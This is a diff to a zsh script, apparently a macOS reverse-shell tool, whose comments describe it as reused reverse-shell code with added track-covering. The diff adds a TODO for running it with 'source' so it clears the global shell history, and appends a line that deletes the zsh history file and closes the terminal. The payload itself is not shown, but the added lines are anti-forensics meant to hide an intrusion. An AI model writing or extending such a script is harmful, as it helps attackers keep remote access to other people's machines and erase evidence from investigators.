@@ -1,7 +1,8 @@
 #!/bin/zsh
 
-# this is more or less the reused code from my mac+linux reverse shell but with more opportunities to cover tracks. speaking of, 
-# TODO: implement anti-forensics, mac makes it a pain in the ass sometimes and im tired.
+#TODO: ENSURE THIS RUNS AS "source macRevShell.sh -I [ip] -P [port]" to make sure it clears the GLOBAL SHELL history and not the .sh subshell
+
+# this is more or less the reused code from my mac+linux reverse shell but more mac based (thru zsh instead of bash) and with covering of tracks.
 
 # Don't touch unless you're modifying the actual payload for macOS
 
@@ -32,3 +33,6 @@ if ps | grep $! > /dev/null; then
 else
     echo "Failed to establish shell."
 fi
+
+# Neato lil command to both clear ALL zsh history as well as close the terminal
+exec rm $HISTFILE
